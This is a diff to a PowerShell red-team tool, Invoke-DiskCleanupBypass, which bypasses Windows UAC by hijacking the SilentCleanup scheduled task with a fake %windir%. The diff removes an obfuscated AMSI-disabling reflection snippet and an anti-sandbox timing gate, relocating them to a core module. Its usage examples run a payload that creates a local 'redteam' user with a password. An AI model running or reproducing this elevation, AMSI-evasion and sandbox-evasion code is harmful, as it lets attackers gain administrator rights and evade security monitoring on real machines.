@@ -76,23 +76,16 @@
     Base directory for the fake %windir%.  Defaults to a random-named
     subdirectory of $env:TEMP.
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait after triggering the task (default: 8).
 
 .EXAMPLE
     # Compile launcher and run silently
-    Invoke-DiskCleanupBypass -PayloadCommand "cmd.exe /c net user /add redteam P@ss1" `
-                              -SkipChecks
+    Invoke-DiskCleanupBypass -PayloadCommand "cmd.exe /c net user /add redteam P@ss1"
 
 .EXAMPLE
     # CopyCmd variant — visible cmd window, no csc.exe required
-    Invoke-DiskCleanupBypass -PayloadCommand "" -PayloadBinaryMode CopyCmdExe -SkipChecks
+    Invoke-DiskCleanupBypass -PayloadCommand "" -PayloadBinaryMode CopyCmdExe
 
 .NOTES
     Authorized red/purple-team use only.  Requires written SOW.
@@ -100,6 +93,8 @@
     The disk artefact (fake cleanmgr.exe) is removed after execution.
     CscCompile mode invokes C:\Windows\Microsoft.NET\Framework64\...\csc.exe
     to JIT-compile a tiny launcher — this itself is a detectable action.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -112,65 +107,11 @@ param(
 
     [string]$FakeDirBase,
 
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
-    [int]   $Timeout = 8
+    [int]$Timeout = 8
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
-
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -EA Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 9600) {
-        Write-Warning "[DiskCleanup] Requires Windows 8.1 (9600+). Current: $xBld"
-        return
-    }
-
-    # Verify SilentCleanup task exists
-    $xTaskCheck = & schtasks /Query /TN '\Microsoft\Windows\DiskCleanup\SilentCleanup' 2>&1
-    if ($LASTEXITCODE -ne 0) {
-        Write-Warning '[DiskCleanup] SilentCleanup task not found on this host.'
-        return
-    }
-
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[DiskCleanup] Already elevated — no bypass needed.'
-        return
-    }
-
-    # Timing gate (anti-sandbox)
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[DiskCleanup] Timing anomaly — aborting.'
-        return
-    }
-}
-#endregion
 
 #region ── Create fake directory structure ───────────────────────────────────
 if (-not $FakeDirBase) {
